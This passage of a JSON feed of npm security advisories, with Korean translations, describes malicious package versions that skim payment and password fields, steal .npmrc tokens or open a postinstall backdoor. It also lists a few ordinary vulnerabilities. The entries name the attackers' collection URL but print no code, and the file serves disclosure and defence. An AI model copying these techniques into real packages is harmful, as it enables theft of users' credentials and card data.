    "description": "Version 0.1.8 of `kraken-api` contains malicious code as a postinstall script. When installed, the package calls home to a Command and Control server to execute arbitrary commands.\n\n\n## Recommendation\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer.\n\n\nUsers may consider downgrading to version 0.1.7\nThe package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
    "identifiers": "GHSA : GHSA-fgfj-rj24-mj7q",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:16:43Z",
    "publishedAt": "2020-09-02T21:47:08Z",
    "references": "https://www.npmjs.com/advisories/914\nhttps://github.com/advisories/GHSA-fgfj-rj24-mj7q",
    "name": "kraken-api",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.1.8",
    "descriptionKR": "`kraken-api` 버전 0.1.8에는 설치 후 스크립트로 악성 코드가 포함되어 있습니다. 패키지가 설치되면 명령 및 제어 서버를 호출하여 임의의 명령을 실행합니다.\n\n\n## 추천\n\n이 패키지가 설치되어 있거나 실행 중인 모든 컴퓨터는 완전히 손상된 것으로 간주해야 합니다. 해당 컴퓨터에 저장된 모든 비밀과 키는 다른 컴퓨터에서 즉시 교체해야 합니다.\n\n\n사용자는 버전 0.1.7로 다운그레이드를 고려할 수 있습니다.\n패키지를 제거해야 하지만 컴퓨터에 대한 모든 권한이 외부 엔터티에 주어졌을 수 있으므로 패키지를 제거하면 설치로 인해 발생하는 모든 악성 소프트웨어가 제거된다는 보장이 없습니다."
  },
  {
    "description": "Version 1.1.5 of `ngx-pica` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.1.4",
    "identifiers": "GHSA : GHSA-76wf-2xcf-6wmx",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:16:18Z",
    "publishedAt": "2020-09-03T00:31:28Z",
    "references": "https://www.npmjs.com/advisories/948\nhttps://github.com/advisories/GHSA-76wf-2xcf-6wmx",
    "name": "ngx-pica",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.1.5",
    "descriptionKR": "`ngx-pica` 버전 1.1.5에는 악성코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 1.1.4로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.6 of `@fangrong/xoc` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment. It's also recommended to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.5",
    "identifiers": "GHSA : GHSA-pjxp-f379-6284",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:15:13Z",
    "publishedAt": "2020-09-03T19:13:27Z",
    "references": "https://www.npmjs.com/advisories/1104\nhttps://github.com/advisories/GHSA-pjxp-f379-6284",
    "name": "@fangrong/xoc",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.6",
    "descriptionKR": "`@fangrong/xoc` 버전 1.0.6에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하십시오. 또한 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인하는 것이 좋습니다.\n\n사용자는 버전 1.0.5로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 8.4.3 of `rc-calendar-jhorst` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 8.4.3 of this module is found installed you will want to replace it with a version before or after 8.4.3. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 8.4.2",
    "identifiers": "GHSA : GHSA-4c87-gg2q-fc6m",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:14:12Z",
    "publishedAt": "2020-09-01T20:31:04Z",
    "references": "https://www.npmjs.com/advisories/633\nhttps://github.com/advisories/GHSA-4c87-gg2q-fc6m",
    "name": "rc-calendar-jhorst",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 8.4.3",
    "descriptionKR": "`rc-calendar-jhorst` 버전 8.4.3에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 8.4.3이 설치된 것으로 확인되면 8.4.3 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 8.4.2로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 0.3.0 of `react-dates-sc` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 0.3.0 of this module is found installed you will want to replace it with a version before or after 0.3.0. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.3.0-beta.83",
    "identifiers": "GHSA : GHSA-5645-gc7h-98h8",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:13:07Z",
    "publishedAt": "2020-09-01T20:32:07Z",
    "references": "https://www.npmjs.com/advisories/634\nhttps://github.com/advisories/GHSA-5645-gc7h-98h8",
    "name": "react-dates-sc",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.3.0",
    "descriptionKR": "`react-dates-sc` 버전 0.3.0에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 0.3.0이 설치된 것으로 확인되면 0.3.0 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 0.3.0-beta.83으로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 2.0.2 of `stream-combine` has malicious code design to steal credentials and credit card information. The code searches all form elements for passwords, credit card numbers and CVC codes. It then uploads the information to a remote server using HTML links embedded in the page or form actions. If your application has Content Security Policy set you are not affected by this issue.\n\n\n## Recommendation\n\nThis package is not available on the npm Registry anymore. If you used this module and your application processed credentials or credit card information, it is possible that information was stolen.\n\nUsers may consider downgrading to version 2.0.1",
    "identifiers": "GHSA : GHSA-w6xj-45gv-fw35",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:12:24Z",
    "publishedAt": "2020-09-02T15:57:06Z",
    "references": "https://www.npmjs.com/advisories/774\nhttps://github.com/advisories/GHSA-w6xj-45gv-fw35",
    "name": "stream-combine",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 2.0.2",
    "descriptionKR": "'stream-combine' 버전 2.0.2는 자격 증명과 신용 카드 정보를 훔치는 악성 코드 디자인을 가지고 있습니다. 이 코드는 암호, 신용 카드 번호 및 CVC 코드에 대한 모든 양식 요소를 검색합니다. 그런 다음 페이지 또는 양식 작업에 포함된 HTML 링크를 사용하여 원격 서버에 정보를 업로드합니다. 애플리케이션에 콘텐츠 보안 정책이 설정되어 있으면 이 문제의 영향을 받지 않습니다.\n\n\n## 추천\n\n이 패키지는 더 이상 npm 레지스트리에서 사용할 수 없습니다. 이 모듈을 사용했고 애플리케이션에서 자격 증명이나 신용 카드 정보를 처리했다면 정보가 도난당했을 가능성이 있습니다.\n\n사용자는 버전 2.0.1로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.2 of `oauth-validator` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 1.0.2 of this module is found installed you will want to replace it with a version before or after 1.0.2. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.1",
    "identifiers": "GHSA : GHSA-cxcf-78mr-wpg7",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:11:25Z",
    "publishedAt": "2020-09-01T20:29:59Z",
    "references": "https://www.npmjs.com/advisories/632\nhttps://github.com/advisories/GHSA-cxcf-78mr-wpg7",
    "name": "oauth-validator",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.2",
    "descriptionKR": "`oauth-validator` 버전 1.0.2에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 1.0.2가 설치된 것으로 확인되면 1.0.2 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 1.0.1로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 0.4.8 of `s3asy` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 0.4.8 of this module is found installed you will want to replace it with a version before or after 0.4.8. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.4.7",
    "identifiers": "GHSA : GHSA-3wjm-33mw-h388",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:10:52Z",
    "publishedAt": "2020-09-01T20:34:14Z",
    "references": "https://www.npmjs.com/advisories/636\nhttps://github.com/advisories/GHSA-3wjm-33mw-h388",
    "name": "s3asy",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.4.8",
    "descriptionKR": "'s3asy' 버전 0.4.8에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 0.4.8이 설치된 것으로 확인되면 0.4.8 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 0.4.7로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 0.0.3 of `jasmin` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 0.0.3 of this module is found installed you will want to replace it with a version before or after 0.0.3. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.0.2",
    "identifiers": "GHSA : GHSA-9cq4-mhmr-84gm",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:06:02Z",
    "publishedAt": "2020-09-01T20:26:49Z",
    "references": "https://www.npmjs.com/advisories/629\nhttps://github.com/advisories/GHSA-9cq4-mhmr-84gm",
    "name": "jasmin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.0.3",
    "descriptionKR": "'jasmin' 버전 0.0.3에는 악성코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 0.0.3이 설치된 것으로 확인되면 0.0.3 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 0.0.2로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 0.9.2 of `slush-fullstack-framework` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment. It's also recommended to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.9.1",
    "identifiers": "GHSA : GHSA-4j54-mmmv-hjpm",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:05:28Z",
    "publishedAt": "2020-09-03T19:17:51Z",
    "references": "https://www.npmjs.com/advisories/1108\nhttps://github.com/advisories/GHSA-4j54-mmmv-hjpm",
    "name": "slush-fullstack-framework",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.9.2",
    "descriptionKR": "`slush-fullstack-framework` 버전 0.9.2에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하십시오. 또한 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인하는 것이 좋습니다.\n\n사용자는 버전 0.9.1로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.3 of `libubx` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.2",
    "identifiers": "GHSA : GHSA-m7xv-7p93-g6q8",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:05:00Z",
    "publishedAt": "2020-09-03T00:35:35Z",
    "references": "https://www.npmjs.com/advisories/938\nhttps://github.com/advisories/GHSA-m7xv-7p93-g6q8",
    "name": "libubx",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.3",
    "descriptionKR": "`libubx` 버전 1.0.3에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 1.0.2로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "In Home Assistant before 0.57, it is possible to inject JavaScript code into a persistent notification via crafted Markdown text, aka XSS.",
    "identifiers": "GHSA : GHSA-7wfq-wmx2-3wr4\nCVE : CVE-2017-16782",
    "severity": "MODERATE",
    "updatedAt": "2023-07-27T20:01:43Z",
    "publishedAt": "2022-05-17T00:20:01Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2017-16782\nhttps://github.com/home-assistant/home-assistant-polymer/pull/514\nhttps://github.com/advisories/GHSA-7wfq-wmx2-3wr4",
    "name": "home-assistant-frontend",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.57",
    "descriptionKR": "0.57 이전의 홈어시스턴트에서는 제작된 Markdown 텍스트(일명 XSS)를 통해 JavaScript 코드를 영구 알림에 삽입할 수 있습니다."
  },
  {
    "description": "### Summary\nUnsafe plugins (for instance `sql-list`) can be installed in subdomain tenants via pack import even if unsafe plugin installation for tenants is disables\n\n### Details\nI have an example\nhttps://bot20230704.saltcorn.com/view/all_plugins\nIt's publicly accessible (but has not so secure values except list of tenants).\nBut using this mech one can read **any** data from other tenants.\n\n### Impact\nAll tenants of installation (i.e. `saltcorn.com`), can be compromised from tenant user has admin access. If an untrusted user has admin rights to a tenant instance, they will be able to install a plug-in that can access information from other tenants",
    "identifiers": "GHSA : GHSA-wxf3-4fvj-vqqx",
    "severity": "HIGH",
    "updatedAt": "2023-07-27T19:28:02Z",
    "publishedAt": "2023-07-27T19:28:02Z",
    "references": "https://github.com/saltcorn/saltcorn/security/advisories/GHSA-wxf3-4fvj-vqqx\nhttps://github.com/advisories/GHSA-wxf3-4fvj-vqqx",
    "name": "@saltcorn/cli",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.8.7",
    "identifier": "0.8.7",
    "descriptionKR": "### 요약\n안전하지 않은 플러그인(예: `sql-list`)은 테넌트에 대한 안전하지 않은 플러그인 설치가 비활성화된 경우에도 팩 가져오기를 통해 하위 도메인 테넌트에 설치할 수 있습니다.\n\n### 세부 정보\n예가 있습니다\nhttps://bot20230704.saltcorn.com/view/all_plugins\n공개적으로 액세스할 수 있습니다(그러나 테넌트 목록을 제외하고는 안전한 값이 없습니다).\n하지만 이 기계를 사용하면 다른 테넌트의 **모든** 데이터를 읽을 수 있습니다.\n\n### 영향\n설치의 모든 테넌트(예: `saltcorn.com`)는 테넌트 사용자가 관리자 액세스 권한을 가지고 있으므로 손상될 수 있습니다. 신뢰할 수 없는 사용자에게 테넌트 인스턴스에 대한 관리자 권한이 있는 경우 다른 테넌트의 정보에 액세스할 수 있는 플러그인을 설치할 수 있습니다."
  },
  {
    "description": "### Impact\nIn Sails apps <=v1.5.6, an attacker can send a virtual request that will cause the node process to crash. \n\n### Patches\nThis behavior was fixed in Sails [v1.5.7](https://github.com/balderdashy/sails/releases/tag/v1.5.7)\n\n### Workarounds\nDisable the sockets hook and remove the `sails.io.js` client\n\n### References\nhttps://github.com/balderdashy/sails/pull/7287\n\nBig thanks to @ThomasRinsma at [Codean](https://www.linkedin.com/company/codeanio/)!",
    "identifiers": "GHSA : GHSA-gpw9-fwm8-7rx7\nCVE : CVE-2023-38504",
    "severity": "HIGH",
    "updatedAt": "2023-07-31T10:04:52Z",
    "publishedAt": "2023-07-27T17:13:14Z",
    "references": "https://github.com/balderdashy/sails/security/advisories/GHSA-gpw9-fwm8-7rx7\nhttps://github.com/balderdashy/sails/pull/7287\nhttps://github.com/balderdashy/sails/releases/tag/v1.5.7\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-38504\nhttps://github.com/balderdashy/sails/commit/4a023dc5095a4b30fdc8535f705ed34cd22d2f7d\nhttps://github.com/advisories/GHSA-gpw9-fwm8-7rx7",
    "name": "sails",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.5.7",
    "identifier": "1.5.7",
    "descriptionKR": "### 영향\nSails 앱 <=v1.5.6에서 공격자는 노드 프로세스를 중단시키는 가상 요청을 보낼 수 있습니다.\n\n### 패치\n이 동작은 Sails[v1.5.7](https://github.com/balderdashy/sails/releases/tag/v1.5.7)에서 수정되었습니다.\n\n### 해결 방법\n소켓 후크를 비활성화하고 `sails.io.js` 클라이언트를 제거합니다.\n\n### 참조\nhttps://github.com/balderdashy/sails/pull/7287\n\n[Codean](https://www.linkedin.com/company/codeanio/)의 @ThomasRinsma에게 큰 감사를 드립니다!"
  },
  {
    "description": "Version 0.0.3 of `angular-location-update` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.0.2",
    "identifiers": "GHSA : GHSA-53jx-4wwh-gcqj",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T00:09:49Z",
    "publishedAt": "2020-09-11T21:11:34Z",
    "references": "https://www.npmjs.com/advisories/930\nhttps://github.com/advisories/GHSA-53jx-4wwh-gcqj",
    "name": "angular-location-update",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.0.3",
    "descriptionKR": "`angular-location-update` 버전 0.0.3에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 0.0.2로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.3.2 of `geoheat` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.3.1",
    "identifiers": "GHSA : GHSA-p32g-242c-76h3",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T00:09:20Z",
    "publishedAt": "2020-09-11T21:14:49Z",
    "references": "https://www.npmjs.com/advisories/932\nhttps://github.com/advisories/GHSA-p32g-242c-76h3",
    "name": "geoheat",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.3.2",
    "descriptionKR": "`geoheat`의 버전 1.3.2에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 1.3.1로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.1.3 of `pensi-scheduler` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment. It's also recommended to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.1.2",
    "identifiers": "GHSA : GHSA-j4ch-mw66-xmqv",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T00:07:26Z",
    "publishedAt": "2020-09-03T19:16:44Z",
    "references": "https://www.npmjs.com/advisories/1107\nhttps://github.com/advisories/GHSA-j4ch-mw66-xmqv",
    "name": "pensi-scheduler",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.1.3",
    "descriptionKR": "'pensi-scheduler' 버전 1.1.3에는 악성코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하십시오. 또한 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인하는 것이 좋습니다.\n\n사용자는 버전 1.1.2로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.8 of `ember-power-timepicker` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.7",
    "identifiers": "GHSA : GHSA-28f8-hqmc-7ph8",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T00:06:45Z",
    "publishedAt": "2020-09-11T21:19:09Z",
    "references": "https://www.npmjs.com/advisories/931\nhttps://github.com/advisories/GHSA-28f8-hqmc-7ph8",
    "name": "ember-power-timepicker",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.8",
    "descriptionKR": "'ember-power-timepicker' 버전 1.0.8에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 1.0.7로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 0.1.1 of `grunt-radic` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.1.0",
    "identifiers": "GHSA : GHSA-9p49-cwh3-4qhf",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T00:05:11Z",
    "publishedAt": "2020-09-11T21:21:19Z",
    "references": "https://www.npmjs.com/advisories/934\nhttps://github.com/advisories/GHSA-9p49-cwh3-4qhf",
    "name": "grunt-radic",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.1.1",
    "descriptionKR": "'grunt-radic' 버전 0.1.1에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 0.1.0으로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 5.0.2 of `eslint-config-eslint` was published without authorization and was found to contain malicious code. This code would read the users `.npmrc` file and send any found authentication tokens to a remote server.\n\n\n## Recommendation\n\nThe best course of action if you found this package installed in your environment is to revoke all your npm tokens. You can find instructions on how to do that here. https://docs.npmjs.com/getting-started/working_with_tokens#how-to-revoke-tokens\n\nUsers may consider downgrading to version 5.0.1",
    "identifiers": "GHSA : GHSA-pv55-r6j3-wp94",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T00:04:07Z",
    "publishedAt": "2020-09-01T20:45:57Z",
    "references": "https://www.npmjs.com/advisories/674\nhttps://github.com/advisories/GHSA-pv55-r6j3-wp94",
    "name": "eslint-config-eslint",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 5.0.2",
    "descriptionKR": "`eslint-config-eslint` 버전 5.0.2가 무단으로 게시되어 악성 코드가 포함된 것으로 밝혀졌습니다. 이 코드는 사용자 `.npmrc` 파일을 읽고 찾은 인증 토큰을 원격 서버로 보냅니다.\n\n\n## 추천\n\n환경에 이 패키지가 설치되어 있는 경우 가장 좋은 조치는 모든 npm 토큰을 취소하는 것입니다. 여기에서 방법에 대한 지침을 찾을 수 있습니다. https://docs.npmjs.com/getting-started/working_with_tokens#how-to-revoke-tokens\n\n사용자는 버전 5.0.1로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.1 of `simple-alipay` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 1.0.1 of this module is found installed you will want to replace it with a version before or after 1.0.1. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.0",
    "identifiers": "GHSA : GHSA-3wh2-2pp3-2823",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T00:02:27Z",
    "publishedAt": "2020-09-01T20:35:18Z",
    "references": "https://www.npmjs.com/advisories/637\nhttps://github.com/advisories/GHSA-3wh2-2pp3-2823",
    "name": "simple-alipay",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.1",
    "descriptionKR": "'심플-알리페이' 1.0.1 버전에는 악성코드가 포함됐다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 1.0.1이 설치된 것으로 확인되면 1.0.1 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 1.0.0으로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.7.5 of `coffee-project` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 1.7.5 of this module is found installed you will want to replace it with a version before or after 1.7.5. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.7.4",
    "identifiers": "GHSA : GHSA-3fv6-q5xv-fhpw",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T00:01:56Z",
    "publishedAt": "2020-09-01T19:50:23Z",
    "references": "https://www.npmjs.com/advisories/621\nhttps://github.com/advisories/GHSA-3fv6-q5xv-fhpw",
    "name": "coffee-project",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.7.5",
